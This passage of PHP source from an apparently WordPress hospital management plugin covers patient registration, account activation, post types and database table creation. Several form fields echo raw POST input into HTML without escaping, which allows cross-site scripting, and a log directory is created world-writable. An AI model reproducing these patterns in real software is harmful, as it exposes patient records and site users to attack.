				<label class="col-sm-2 control-label" for="symptoms"><?php _e('Symptoms','hospital_mgt');?><span class="require-field">*</span></label>
				<div class="col-sm-8">
						<select class="form-control symptoms_list validate[required]" multiple="multiple" name="symptoms[]" id="symptoms">					
						<?php 
						$user_object=new MJ_hmgt_user();
						$symptoms_category = $user_object->getPatientSymptoms();
						
						if(!empty($symptoms_category))
						{
							foreach ($symptoms_category as $retrive_data)
							{
								
								?>
								<option value="<?php echo $retrive_data->ID; ?>"><?php echo $retrive_data->post_title; ?></option>
								<?php
							}
						}
						?>					
						</select>
						<br>					
					</div>					
			</div>	
		<div class="diagnosissnosis_div">
			<div class="form-group">
				<label class="col-sm-2 control-label" for="diagnosis"><?php _e('Diagnosis Report','hospital_mgt');?></label>
				<div class="col-sm-8">
					<input type="file" class="form-control file dignosisreport" name="diagnosis[]">
				</div>
			</div>	
		</div>
		<div class="form-group">			
			<div class="col-sm-2">
			</div>
			<div class="col-sm-8">
				<input type="button" value="<?php _e('Add More Report','hospital_mgt') ?>" name="add_more_report" class="add_more_report btn btn-default">
			</div>
		</div>
		<input type="hidden"  name="doctor" value="">
			
		<div class="form-group">
			<label class="col-sm-2 control-label" for="address"><?php _e('Address','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
				<input id="address" class="form-control validate[required,custom[address_description_validation]]" type="text" maxlength="150"  name="address" 
				value="<?php if($edit){ echo $user_info->address;}elseif(isset($_POST['address'])) echo $_POST['address'];?>">
			</div>
		</div>
		
		<div class="form-group">
			<label class="col-sm-2 control-label" for="city_name"><?php _e('City','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
				<input id="city_name" class="form-control validate[required,custom[city_state_country_validation]]" type="text"  name="city_name" maxlength="50"
				value="<?php if($edit){ echo $user_info->city_name;}elseif(isset($_POST['city_name'])) echo $_POST['city_name'];?>">
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-2 control-label" for="state_name"><?php _e('State','hospital_mgt');?></label>
			<div class="col-sm-8">
				<input id="state_name" class="form-control validate[custom[city_state_country_validation]]" type="text"  name="state_name" maxlength="50"
				value="<?php if($edit){ echo $user_info->state_name;}elseif(isset($_POST['state_name'])) echo $_POST['state_name'];?>">
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-2 control-label" for="state_name"><?php _e('Country','hospital_mgt');?></label>
			<div class="col-sm-8">
				<input id="country_name" class="form-control validate[custom[city_state_country_validation]]" type="text"  name="country_name" maxlength="50"
				value="<?php if($edit){ echo $user_info->country_name;}elseif(isset($_POST['country_name'])) echo $_POST['country_name'];?>">
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-2 control-label" for="zip_code"><?php _e('Zip Code','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
				<input id="zip_code" class="form-control  validate[required,custom[onlyLetterNumber]]" type="text" maxlength="15"  name="zip_code" 
				value="<?php if($edit){ echo $user_info->zip_code	;}elseif(isset($_POST['zip_code'])) echo $_POST['zip_code'];?>">
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-2 control-label " for="mobile"><?php _e('Mobile','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-1" style="padding-right: 0px;">
			<input type="text" value="<?php if(isset($_POST['phonecode'])){ echo $_POST['phonecode']; }else{ ?>+<?php echo MJ_hmgt_get_countery_phonecode(get_option( 'hmgt_contry' )); }?>"  class="form-control  validate[required] onlynumber_and_plussign" name="phonecode" maxlength="5">
			</div>
			<div class="col-sm-7">
				<input id="mobile" class="form-control validate[required,custom[phone_number]] text-input" minlength="6" maxlength="15" type="text" value="" name="mobile">				
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-2 control-label " for="phone"><?php _e('Phone','hospital_mgt');?></label>
			<div class="col-sm-8">
				<input id="phone" class="form-control validate[custom[phone_number]] text-input" minlength="6" maxlength="15" type="text" value="" name="phone">				
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-2 control-label " for="email"><?php _e('Email','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
				<input id="email" class="form-control validate[required,custom[email]] text-input" maxlength="100" type="text"  name="email" 
				value="<?php if($edit){ echo $user_info->user_email;}elseif(isset($_POST['email'])) echo $_POST['email'];?>">
			</div>
		</div>
		
		<div class="form-group">
			<label class="col-sm-2 control-label" for="username"><?php _e('User Name','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
				<input id="username" class="form-control validate[required,custom[username_validation]]" type="text"  name="username" maxlength="30"
				value="<?php if($edit){ echo $user_info->user_login;}elseif(isset($_POST['username'])) echo $_POST['username'];?>" <?php if($edit) echo "readonly";?>>
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-2 control-label" for="password"><?php _e('Password','hospital_mgt');?><?php if(!$edit) {?><span class="require-field">*</span><?php }?></label>
			<div class="col-sm-8">
				<input id="password" class="form-control <?php if(!$edit) echo 'validate[required,minSize[8]]';?>" type="password"  name="password" maxlength="12" value="">
			</div>
		</div>
	
			<div class="form-group">
			<label class="col-sm-2 control-label" for="photo"><?php _e('Image','hospital_mgt');?></label>
			
				<div class="col-sm-8">
				<input type="file" class="form-control file" name="hmgt_user_avatar">
			</div>
			
			</div>	
			<div class="col-sm-offset-2 col-sm-8">
        	
        	<input type="submit" value="<?php  _e('Patient Registration','hospital_mgt'); ?>" name="registration_front_patient" class="btn btn-success"/>
        </div>
    </form>
	</div>
    <?php
}
//patient registration fronted //
function MJ_hmgt_patient_registration_function()
{
	global $patient_id,$first_name,$middle_name,$last_name,$gender,$birth_date,$blood_group,$symptoms,$diagnosis,
	$doctor,$address,$city_name,$state_name,$country_name,$zip_code,$phonecode,$mobile,$phone,$email,
	$username,$password,$hmgt_user_avatar;
	
    if ( isset($_POST['registration_front_patient'] ) ) 
	{
		
        MJ_hmgt_registration_validation(		
		$_POST['patient_id'],
		
		$_POST['first_name'],
		$_POST['middle_name'],
		$_POST['last_name'],
		$_POST['gender'],
		MJ_hmgt_get_format_for_db($_POST['birth_date']),
		$_POST['blood_group'],
		$_POST['symptoms'],		
		$_FILES['diagnosis'],
		$_POST['doctor'],
		$_POST['address'],
		$_POST['city_name'],
		$_POST['state_name'],
		$_POST['country_name'],
		$_POST['zip_code'],
		$_POST['phonecode'],		
		$_POST['mobile'],		
		$_POST['phone'],
		$_POST['email'],
        $_POST['username'],
        $_POST['password'],        
        'hmgt_user_avatar'
        
        );        
		 
        // sanitize user form input //
        global $patient_id,$first_name,$middle_name,$last_name,$gender,$birth_date,$blood_group,$symptoms,$diagnosis,
	$doctor,$address,$city_name,$state_name,$country_name,$zip_code,$phonecode,$mobile,$phone,$email,
	$username,$password,$hmgt_user_avatar;
        $patient_id =    $_POST['patient_id'] ;		
		$first_name =    MJ_hmgt_strip_tags_and_stripslashes($_POST['first_name']);
		$middle_name =   MJ_hmgt_strip_tags_and_stripslashes($_POST['middle_name']);
		$last_name =  MJ_hmgt_strip_tags_and_stripslashes($_POST['last_name']);
		$gender =   $_POST['gender'] ;
		$birth_date =   MJ_hmgt_get_format_for_db($_POST['birth_date']);
		$blood_group =   $_POST['blood_group'] ;
		if(!empty($_POST['symptoms']))
		{	
			$symptoms =   implode(",",$_POST['symptoms']);
		}
		else
		{
			$symptoms ='';
		}		
		$diagnosis =   $_FILES['diagnosis'];
		$doctor =   $_POST['doctor'] ;
		$address =   MJ_hmgt_strip_tags_and_stripslashes($_POST['address']);
		$city_name =    MJ_hmgt_strip_tags_and_stripslashes($_POST['city_name']);
		$state_name =   MJ_hmgt_strip_tags_and_stripslashes($_POST['state_name']);
		$country_name =   MJ_hmgt_strip_tags_and_stripslashes($_POST['country_name']);
		$zip_code =   $_POST['zip_code'] ;
		$phonecode =   $_POST['phonecode'] ;		
		$mobile =   $_POST['mobile'] ;		
		$phone =   $_POST['phone'] ;		
		$username   =    MJ_hmgt_strip_tags_and_stripslashes($_POST['username']);
        $password   =    $_POST['password'] ;
        $email      =    $_POST['email'] ;
        
 
        // call @function complete_registration to create the user
        // only when no WP_error is found
        MJ_hmgt_complete_registration(
       $patient_id,$first_name,$middle_name,$last_name,$gender,$birth_date,$blood_group,$symptoms,$diagnosis,
	$doctor,$address,$city_name,$state_name,$country_name,$zip_code,$phonecode,$mobile,$phone,$email,
	$username,$password,$hmgt_user_avatar);
    }
 
    MJ_hmgt_registration_form(
      $patient_id,$first_name,$middle_name,$last_name,$gender,$birth_date,$blood_group,$symptoms,$diagnosis,
	$doctor,$address,$city_name,$state_name,$country_name,$zip_code,$phonecode,$mobile,$phone,$email,
	$username,$password,$hmgt_user_avatar);

}
function MJ_hmgt_activat_mail_link()
{

	if(isset($_REQUEST['haskey']) && isset($_REQUEST['id']))
	{		
	
	global $wpdb;
		$table_users=$wpdb->prefix.'users';
		$user = get_userdatabylogin($_REQUEST['id']);
   $user_id =  $user->ID; // prints the id of the user
		if( get_user_meta($user_id, 'hmgt_hash', true))
		{
		
			if(get_user_meta($user_id, 'hmgt_hash', true) == $_REQUEST['haskey'])
			{
				delete_user_meta($user_id, 'hmgt_hash');
				$curr_args = array(
			'page_id' => get_option('hmgt_login_page'),
			'smgt_activate' => 1
	);

	$referrer_faild = add_query_arg( $curr_args, get_permalink( get_option('hmgt_login_page') ) );
				wp_redirect($referrer_faild);
				exit;
			}
			else
			{
				$curr_args = array(
			'page_id' => get_option('hmgt_login_page'),
			'smgt_activate' => 2
	);
	
	$referrer_faild = add_query_arg( $curr_args, get_permalink( get_option('hmgt_login_page') ) );
				wp_redirect($referrer_faild);
				exit;
			}
			
		}
		wp_redirect(home_url('/'));
				exit;
	
	}
}
//add user authenticate filter
add_filter('wp_authenticate_user', function($user) 
{
  
	$havemeta = get_user_meta($user->ID, 'hmgt_hash', true);
	if($havemeta)
	{
		global $reg_errors;
	$reg_errors = new WP_Error;
	return $reg_errors->add( 'not_active', 'Please active account' );
	}
	return $user;
		
	
}, 10, 2);

add_action( 'plugins_loaded', 'MJ_hmgt_domain_load' );
add_action('wp_enqueue_scripts','MJ_hmgt_load_script1');
add_action('init','MJ_hmgt_install_login_page');
add_action('init','MJ_hmgt_install_patient_registration_page');
add_action('init','MJ_hmgt_activat_mail_link');
add_action('wp_head','MJ_hmgt_user_dashboard');
add_shortcode( 'hmgt_login','MJ_hmgt_login_link' );
add_action('init','MJ_hmgt_output_ob_start');
add_shortcode( 'hmgt_patient_registration', 'MJ_hmgt_patient_registration_shortcode' );
// The callback function that will replace [book]
//patient registration shortcode //
function MJ_hmgt_patient_registration_shortcode()
{
    ob_start();
    MJ_hmgt_patient_registration_function();
    return ob_get_clean();
}
//log file directory and file create
function MJ_hmgt_output_ob_start()
{
	if (!file_exists(HMS_LOG_DIR))
		mkdir(HMS_LOG_DIR, 0777, true);
		$file_name = 'hmgt_log.txt';
		if (!file_exists(HMS_LOG_DIR.$file_name))
		{
			$fh = fopen(HMS_LOG_DIR.$file_name, 'w');
			
		}		
	ob_start();
}
//Register Post Type
function MJ_hmgt_register_post()
{
	register_post_type( 'hmgt_event', array(

			'labels' => array(

					'name' => __( 'Event', 'hospital_mgt' ),

					'singular_name' => 'hmgt_event'),

			'rewrite' => false,

			'query_var' => false ) );
	register_post_type( 'hmgt_notice', array(
	
			'labels' => array(
	
					'name' => __( 'Notice', 'hospital_mgt' ),
	
					'singular_name' => 'hmgt_notice'),
	
			'rewrite' => false,
	
			'query_var' => false ) );
	register_post_type( 'bedtype_category', array(
	
			'labels' => array(
	
					'name' => __( 'Bed Category', 'hospital_mgt' ),
	
					'singular_name' => 'bedtype_category'),
	
			'rewrite' => false,
	
			'query_var' => false ) );
	register_post_type( 'department', array(
	
			'labels' => array(
	
					'name' => __( 'Department', 'hospital_mgt' ),
	
					'singular_name' => 'department'),
	
			'rewrite' => false,
	
			'query_var' => false ) );
	
	register_post_type( 'hmgt_message', array(
	
			'labels' => array(
	
					'name' => __( 'Message', 'hospital_mgt' ),
	
					'singular_name' => 'hmgt_message'),
	
			'rewrite' => false,
	
			'query_var' => false ) );
	
	register_post_type( 'medicine_category', array(
	
			'labels' => array(
	
					'name' => __( 'Medicine Category', 'hospital_mgt' ),
	
					'singular_name' => 'medicine_category'),
	
			'rewrite' => false,
	
			'query_var' => false ) );
	
	register_post_type( 'nurse_notes', array(
	
			'labels' => array(
	
					'name' => __( 'Nurse Notes', 'hospital_mgt' ),
	
					'singular_name' => 'nurse_notes'),
	
			'rewrite' => false,
	
			'query_var' => false ) );
	
	register_post_type( 'operation_category', array(
	
			'labels' => array(
	
					'name' => __( 'Operation Category', 'hospital_mgt' ),
	
					'singular_name' => 'operation_category'),
	
			'rewrite' => false,
	
			'query_var' => false ) );
	
	register_post_type( 'report_type_category', array(
	
			'labels' => array(
	
					'name' => __( 'Report Type', 'hospital_mgt' ),
	
					'singular_name' => 'report_type_category'),
	
			'rewrite' => false,
	
			'query_var' => false ) );
	
	register_post_type( 'specialization', array(
	
			'labels' => array(
	
					'name' => __( 'Spacialization', 'hospital_mgt' ),
	
					'singular_name' => 'specialization'),
	
			'rewrite' => false,
	
			'query_var' => false ) );

}

//Plug in activate time prescription type default treatment //
function MJ_hmgt_prescription_type_default()
{
	global $wpdb;	
	$table_prescription=$wpdb->prefix. 'hmgt_priscription';
	
	$obj_var=new MJ_hmgt_prescription();
	$prescriptiondata=$obj_var->get_all_prescription();
	if(!empty($prescriptiondata))
	{
		foreach ($prescriptiondata as $retrieved_data)
		{
			if(empty($retrieved_data->prescription_type))
			{
				$prescription_dataid['priscription_id'] = $retrieved_data->priscription_id;
			
				$pre_Data['prescription_type']='treatment';
				
				$result=$wpdb->update( $table_prescription, $pre_Data ,$prescription_dataid);
			}			
		}		
	}		
}
//Plug in activate time operation and diagnosis category in json //
function MJ_hmgt_operation_and_diagnosis_category_in_json()
{
	//operation category
	$operation_type=new MJ_hmgt_operation();
	$operation_array =$operation_type->get_all_operationtype();
	
	if(!empty($operation_array))
	{
		foreach ($operation_array as $retrieved_data)
		{
			if(MJ_hmgt_isJSON($retrieved_data->post_title))
			{
				
			}
			else
			{							
				$operation_type_array=array("category_name"=>$retrieved_data->post_title,"operation_cost"=>0,"operation_tax"=>null,"operation_description"=>null);
					
				$operation_type=json_encode($operation_type_array);
						
				$update_operation_type_array = array(
				  'ID'           => $retrieved_data->ID,
				  'post_status'   => 'publish',
				  'post_title' => $operation_type
				);
				$result=wp_update_post($update_operation_type_array );	
			}
		}
	}
	//diagnosis category
	$report_type=new MJ_hmgt_dignosis();
	$operation_array =$report_type->get_all_report_type();
	if(!empty($operation_array))
	{
		foreach ($operation_array as $retrieved_data)
		{
			if(MJ_hmgt_isJSON($retrieved_data->post_title))
			{
				
			}
			else
			{
				$report_type_array=array("category_name"=>$retrieved_data->post_title,"report_cost"=>0,"diagnosis_tax"=>null,"diagnosis_description"=>null);
			
				$report_type=json_encode($report_type_array);		
				
				$update_dagnosis_report_array = array(
				  'ID'           =>$retrieved_data->ID,
				  'post_status'   => 'publish',
				  'post_title' => $report_type
				);
				$result=wp_update_post($update_dagnosis_report_array );	
			}
		}
	}	
}
//Plug in activate time Install Table //
function MJ_hmgt_install_tables()
{
	require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
	global $wpdb;
	$table_hmgt_admit_reason = $wpdb->prefix . 'hmgt_admit_reason';

	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_admit_reason." (
			 `reason_is` int(11) NOT NULL AUTO_INCREMENT,
			  `admit_reason` varchar(100) NOT NULL,
			  `create_date` date NOT NULL,
			  `create_by` int(11) NOT NULL,
			  PRIMARY KEY (`reason_is`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_ambulance = $wpdb->prefix . 'hmgt_ambulance';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_ambulance." (
			 `amb_id` int(11) NOT NULL AUTO_INCREMENT,
			  `ambulance_id` varchar(30) NOT NULL,
			  `registerd_no` varchar(25) NOT NULL,
			  `driver_name` varchar(50) NOT NULL,
			  `driver_address` varchar(300) NOT NULL,
			  `driver_phoneno` varchar(20) NOT NULL,
			  `charge` int(11) NOT NULL,
			  `description` text NOT NULL,
			  `driver_image` varchar(200) NOT NULL,
			  `amb_created_date` date NOT NULL,
			  `amb_createdby` int(11) NOT NULL,
			  PRIMARY KEY (`amb_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_ambulance_req = $wpdb->prefix . 'hmgt_ambulance_req';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_ambulance_req." (
			`amb_req_id` int(11) NOT NULL AUTO_INCREMENT,
			  `ambulance_id` int(11) NOT NULL,
			  `patient_id` int(11) NOT NULL,
			  `address` varchar(1000) NOT NULL,
			  `charge` int(11) NOT NULL,
			  `request_date` date NOT NULL,
			  `request_time` time NOT NULL,
			  `dispatch_time` time NOT NULL,
			  `amb_req_create_date` date NOT NULL,
			  `amb_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`amb_req_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_appointment = $wpdb->prefix . 'hmgt_appointment';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_appointment." (
			`appointment_id` int(11) NOT NULL AUTO_INCREMENT,
			  `appointment_date` date NOT NULL,
			  `appointment_time` text NOT NULL,
			  `appointment_time_with_a` text NOT NULL,
			  `appointment_time_string` varchar(50) NOT NULL,
			  `patient_id` int(11) NOT NULL,
			  `doctor_id` int(11) NOT NULL,
			  `appointment_status` int(11) NOT NULL,
			  `appoint_create_date` date NOT NULL,
			  `appoint_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`appointment_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	
	
	$table_hmgt_assign_type = $wpdb->prefix . 'hmgt_assign_type';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_assign_type." (
			`assign_id` int(11) NOT NULL AUTO_INCREMENT,
			  `child_id` int(11) NOT NULL,
			  `parent_id` int(11) NOT NULL,
			  `assign_type` varchar(30) NOT NULL,
			  `assign_date` date NOT NULL,
			  `assign_by` int(11) NOT NULL,
			  PRIMARY KEY (`assign_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_bed = $wpdb->prefix . 'hmgt_bed';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_bed." (
			`bed_id` int(11) NOT NULL AUTO_INCREMENT,
			  `bed_number` varchar(10) NOT NULL,
			  `bed_type_id` int(11) NOT NULL,
			  `bed_charges` double NOT NULL,
			  `bed_description` text NOT NULL,
			  `bed_create_date` date NOT NULL,
			  `bed_create_by` int(11) NOT NULL,
			  `status` tinyint(1) NOT NULL,
			  PRIMARY KEY (`bed_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_bed_allotment = $wpdb->prefix . 'hmgt_bed_allotment';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_bed_allotment." (
			`bed_allotment_id` int(11) NOT NULL AUTO_INCREMENT,
			  `bed_type_id` int(11) NOT NULL,
			  `bed_number` int(11) NOT NULL,
			  `patient_id` int(11) NOT NULL,
			  `patient_status` varchar(20) NOT NULL,
			  `allotment_date` date NOT NULL,
			  `discharge_time` date NOT NULL,
			  `allotment_description` text NOT NULL,
			  `created_date` int(11) NOT NULL,
			  `allotment_by` int(11) NOT NULL,
			  PRIMARY KEY (`bed_allotment_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_bld_donor = $wpdb->prefix . 'hmgt_bld_donor';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_bld_donor." (
			 `bld_donor_id` int(11) NOT NULL AUTO_INCREMENT,
			  `donor_name` varchar(100) NOT NULL,
			  `donor_gender` varchar(50) NOT NULL,
			  `donor_age` int(10) NOT NULL,
			  `donor_phone` varchar(25) NOT NULL,
			  `donor_email` varchar(50) NOT NULL,
			  `blood_group` varchar(20) NOT NULL,
			  `last_donet_date` date NOT NULL,
			  `donor_create_date` date NOT NULL,
			  `donor_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`bld_donor_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_blood_bank = $wpdb->prefix . 'hmgt_blood_bank';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_blood_bank." (
			 `blood_id` int(11) NOT NULL AUTO_INCREMENT,
			  `blood_group` varchar(10) NOT NULL,
			  `blood_status` int(10) NOT NULL,
			  `blood_create_date` date NOT NULL,
			  `blood_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`blood_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_charges = $wpdb->prefix . 'hmgt_charges';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_charges." (
			`charges_id` int(11) NOT NULL AUTO_INCREMENT,
			  `charge_label` varchar(100) NOT NULL,
			  `charge_type` varchar(100) NOT NULL,
			  `room_number` varchar(100) NOT NULL,
			  `bed_type` varchar(100) NOT NULL,
			  `charges` int(11) NOT NULL,
			  `patient_id` int(11) NOT NULL,
			  `status` tinyint(4) NOT NULL,
			  `refer_id` int(11) NOT NULL,
			  `created_date` date NOT NULL,
			  `created_by` int(11) NOT NULL,
			  PRIMARY KEY (`charges_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_diagnosis = $wpdb->prefix . 'hmgt_diagnosis';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_diagnosis." (
			`diagnosis_id` int(11) NOT NULL AUTO_INCREMENT,
			  `diagnosis_date` date NOT NULL,
			  `patient_id` int(11) NOT NULL,
			  `report_type` varchar(100) NOT NULL,
			 `report_cost` int(11) NOT NULL,
			  `attach_report` varchar(500) NOT NULL,
			  `diagno_description` text NOT NULL,
			  `diagno_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`diagnosis_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_history = $wpdb->prefix . 'hmgt_history';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_history." (
			`id` int(11) NOT NULL AUTO_INCREMENT,
			  `patient_id` int(11) NOT NULL,
			  `status` varchar(30) NOT NULL,
			  `bed_number` varchar(20) NOT NULL,
			  `guardian_name` varchar(200) NOT NULL,
			  `history_type` varchar(30) NOT NULL,
			  `parent_id` int(11) NOT NULL,
			  `history_date` datetime NOT NULL,
			  `created_by` int(11) NOT NULL,
			  PRIMARY KEY (`id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_inpatient_guardian = $wpdb->prefix . 'hmgt_inpatient_guardian';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_inpatient_guardian." (
			`inpatient_id` int(11) NOT NULL AUTO_INCREMENT,
			  `guardian_id` varchar(20) NOT NULL,
			  `patient_id` int(11) NOT NULL,
			  `first_name` varchar(100) NOT NULL,
			  `middle_name` varchar(100) NOT NULL,
			  `last_name` varchar(100) NOT NULL,
			  `gr_gender` varchar(50) NOT NULL,
			  `gr_address` varchar(200) NOT NULL,
			  `gr_city` varchar(100) NOT NULL,
			  `gr_state` varchar(100) NOT NULL,
			  `gr_country` varchar(100) NOT NULL,
			  `gr_zipcode` int(11) NOT NULL,
			  `gr_mobile` varchar(25) NOT NULL,
			  `gr_phone` varchar(25) NOT NULL,
			  `gr_relation` varchar(50) NOT NULL,
			  `image` varchar(200) NOT NULL,
			  `admit_date` date NOT NULL,
			  `admit_time` time NOT NULL,
			  `patient_status` varchar(100) NOT NULL,
			  `doctor_id` int(11) NOT NULL,
			  `symptoms` text NOT NULL,
			  `inpatient_create_date` date NOT NULL,
			  `inpatient_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`inpatient_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_invoice = $wpdb->prefix . 'hmgt_invoice';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_invoice." (
			`invoice_id` int(11) NOT NULL AUTO_INCREMENT,
			  `invoice_title` varchar(100) NOT NULL,
			  `invoice_number` varchar(25) NOT NULL,
			  `patient_id` int(11) NOT NULL,
			  `invoice_create_date` date NOT NULL,
			  `vat_percentage` double NOT NULL,
			  `discount` double NOT NULL,
			  `status` varchar(50) NOT NULL,
			  `invoice_amount` int(11) NOT NULL,
			  `invoice_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`invoice_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_medicine = $wpdb->prefix . 'hmgt_medicine';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_medicine." (
			`medicine_id` int(11) NOT NULL AUTO_INCREMENT,
			  `med_uniqueid` varchar(100) NOT NULL,
			  `medicine_name` varchar(100) NOT NULL,
			   `batch_number` varchar(100) NOT NULL,
			  `med_cat_id` int(11) NOT NULL,
			  `medicine_price` int(11) NOT NULL,
			  `med_quantity` int(11) NOT NULL,
			  `med_tax` double NOT NULL,
			  `medicine_menufacture` varchar(250) NOT NULL,
			  `medicine_description` text NOT NULL,
			   `note` text NOT NULL,
			   `medicine_expiry_date` varchar(50) NOT NULL,
			   `manufactured_date` varchar(50) NOT NULL,
			  `medicine_stock` varchar(5) NOT NULL,
			  `med_create_date` date NOT NULL,
			  `med_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`medicine_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	
	
	$table_hmgt_dispatch_medicine = $wpdb->prefix . 'hmgt_dispatch_medicine';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_dispatch_medicine." (
			 `id` int(20) NOT NULL AUTO_INCREMENT,
			  `madicine` varchar(255) NOT NULL,
			  `patient` int(20) NOT NULL,
			  `prescription_id` int(20) NOT NULL,
			  `med_price` int(20) NOT NULL,
			  `total_tax_amount` int(20) NOT NULL,
			  `discount` int(20) NOT NULL,
			  `sub_total` int(20) NOT NULL,
			  `description` text NOT NULL,
			  `med_create_date` varchar(200) NOT NULL,
			  `med_create_by` int(20) NOT NULL,
			  PRIMARY KEY (`id`)
			) DEFAULT CHARSET=utf8";
		dbDelta($sql);
	
	
	
	$table_hmgt_message = $wpdb->prefix . 'hmgt_message';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_message." (
			`message_id` int(11) NOT NULL AUTO_INCREMENT,
			  `sender` varchar(100) NOT NULL,
			  `receiver` varchar(100) NOT NULL,
			  `msg_date` date NOT NULL,
			  `msg_subject` varchar(100) NOT NULL,
			  `message_body` text NOT NULL,
			  `msg_status` tinyint(4) NOT NULL,
			  PRIMARY KEY (`message_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_ot = $wpdb->prefix . 'hmgt_ot';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_ot." (
			 `operation_id` int(11) NOT NULL AUTO_INCREMENT,
			  `operation_title` varchar(100) NOT NULL,
			  `patient_id` int(11) NOT NULL,
			  `patient_status` varchar(25) NOT NULL,
			  `bed_type_id` int(11) NOT NULL,
			  `bednumber` int(11) NOT NULL,
			  `doctor_id` int(11) NOT NULL,
			  `operation_date` date NOT NULL,
			  `operation_time` time NOT NULL,
			  `ot_description` text NOT NULL,
			  `operation_charge` int(11) NOT NULL,
			  `ot_create_date` date NOT NULL,
			  `ot_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`operation_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_priscription = $wpdb->prefix . 'hmgt_priscription';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_priscription." (
			`priscription_id` int(11) NOT NULL AUTO_INCREMENT,
			  `pris_create_date` date NOT NULL,
			  `patient_id` int(11) NOT NULL,
			  `teratment_id` int(11) NOT NULL,
			  `case_history` text NOT NULL,
			  `medication_list` text NOT NULL,
			  `treatment_note` text NOT NULL,
			  `prescription_by` int(11) NOT NULL,
			  `custom_field` varchar(6000) NOT NULL,
			  PRIMARY KEY (`priscription_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_report = $wpdb->prefix . 'hmgt_report';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_report." (
			`rid` int(11) NOT NULL AUTO_INCREMENT,
			  `patient_id` int(11) NOT NULL,
			  `report_type` varchar(10) NOT NULL,
			  `report_description` text NOT NULL,
			  `report_date` date NOT NULL,
			  `created_date` date NOT NULL,
			  `createdby` int(11) NOT NULL,
			  PRIMARY KEY (`rid`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_treatment = $wpdb->prefix . 'hmgt_treatment';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_treatment." (
			`treatment_id` int(11) NOT NULL AUTO_INCREMENT,
			  `treatment_name` varchar(100) NOT NULL,
			  `treatment_price` double NOT NULL,
			  `treat_create_Date` date NOT NULL,
			  `treat_create_by` int(11) NOT NULL,
			  PRIMARY KEY (`treatment_id`)
			) DEFAULT CHARSET=utf8";
	dbDelta($sql);
	
	$table_hmgt_income_expense = $wpdb->prefix . 'hmgt_income_expense';
	$sql = "CREATE TABLE IF NOT EXISTS ".$table_hmgt_income_expense." (
		  `income_id` int(11) NOT NULL AUTO_INCREMENT,
		  `invoice_type` varchar(25) NOT NULL,
		  `party_name` text NOT NULL,
		  `income_entry` text NOT NULL,
		  `payment_status` varchar(25) NOT NULL,
		  `income_create_by` int(11) NOT NULL,
		  `income_create_date` date NOT NULL,
